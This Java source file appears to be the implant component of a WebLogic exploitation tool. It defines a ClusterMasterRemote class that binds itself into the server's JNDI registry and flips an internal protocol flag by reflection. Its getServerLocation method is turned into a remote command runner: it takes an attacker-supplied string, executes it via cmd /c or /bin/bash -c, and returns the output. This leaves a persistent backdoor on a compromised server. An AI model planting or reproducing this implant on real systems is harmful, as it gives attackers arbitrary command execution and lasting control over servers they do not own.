/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.call;

import weblogic.cluster.singleton.ClusterMasterRemote;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.*;
import java.lang.reflect.Field;
import java.rmi.RemoteException;

/**
 * Title: com.weblogic.framework.call.RmiPocServerClusterMasterRemote
 * Desc: PocServer for ClusterMasterRemote
 * Date:2020/3/22 0:36
 * @author 0nise
 * @version 1.0.0
 */
public class PocServerClusterMasterRemote implements ClusterMasterRemote {

    public static void main(String[] args) {
        PocServerClusterMasterRemote pocServer = new PocServerClusterMasterRemote();
        String clientName = args[0];
        pocServer.rmiBind(clientName);
    }

    private static String CLIENT_NAME = "999999";

    static {
        jndiBind("");
    }

    public static void jndiBind(String clientName) {
        //patch weblogic Nat
        try {
            Field enableProtocolSwitch = Class.forName("weblogic.rjvm.ConnectionManagerServer").getDeclaredField("enableProtocolSwitch");
            enableProtocolSwitch.setAccessible(true);
            enableProtocolSwitch.set(null,true);
        }catch (Throwable e){

        }
        try {
            if("".equals(clientName)){
                return;
            }
            PocServerClusterMasterRemote rmiServer = new PocServerClusterMasterRemote();
            Context context = new InitialContext();
            context.rebind(clientName, rmiServer);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * rmi bind
     * @param clientName bind 名称
     * @throws RemoteException
     */
    public void rmiBind(String clientName) {
        try {
            PocServerClusterMasterRemote rmiServer = new PocServerClusterMasterRemote();
            Context context = new InitialContext();
            context.rebind(clientName, rmiServer);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void setServerLocation(String s, String s1) throws RemoteException {

    }

    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        String[] splitArr = cmd.split("@@");
        cmd = splitArr[0];
        String charsetName = splitArr[1];
        charsetName = charsetName.trim().toUpperCase();
        if(charsetName.indexOf("####") != -1){
            charsetName = charsetName.substring(0,charsetName.indexOf("####"));
        }
        return execCmd(cmd, charsetName);
    }

    /**
     * 执行命令
     * @param cmd 执行命令
     * @param charsetName 编码
     * @return 执行结果
     * @throws RemoteException
     */
    public String execCmd(String cmd, String charsetName) throws RemoteException {
        if(cmd == null || "".equals(cmd)){
            return "commond not null";
        }
        if("".equals(charsetName) || charsetName ==null){
            charsetName = "UTF-8";
        }
        charsetName = charsetName.trim();
        if(charsetName.toUpperCase().equals("UTF-8")){
            charsetName = "UTF-8";
        }else if(charsetName.toUpperCase().equals("GBK")){
            charsetName = "GBK";
        }else{
            charsetName = "UTF-8";
        }
        cmd = cmd.trim();
        StringBuilder result = new StringBuilder();
        Process process = null;
        BufferedReader bufrIn = null;
        BufferedReader bufrError = null;
        String os = System.getProperty("os.name");
        os = os.toLowerCase();
        String[] executeCmd = null;
        if(os.contains("win")){
            if(cmd.contains("ping") && !cmd.contains("-n")){
                cmd += " -n 4";
            }
            executeCmd = new String[]{"cmd", "/c", cmd};
        }else{
            if(cmd.contains("ping") && !cmd.contains("-n")){
                cmd += " -t 4";
            }
            executeCmd = new String[]{"/bin/bash", "-c", cmd};
        }
        try {
            process = Runtime.getRuntime().exec(executeCmd);
            process.waitFor();
            bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), charsetName));
            bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), charsetName));
            String line = null;
            while ((line = bufrIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufrError.readLine()) != null) {
                result.append(line).append('\n');
            }
        } catch (InterruptedException e) {
        } catch (UnsupportedEncodingException e) {
        } catch (IOException e) {
            return cmd+" execute error,msg: not found commond";
        } finally {
            closeStream(bufrIn);
            closeStream(bufrError);
            if (process != null) {
                process.destroy();
            }
        }
        if(result == null || "".equals(result)){
            return cmd+" execute ok!";
        }else{
            return result.toString();
        }
    }

    private void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
                // TODO:
            }
        }
    }

}
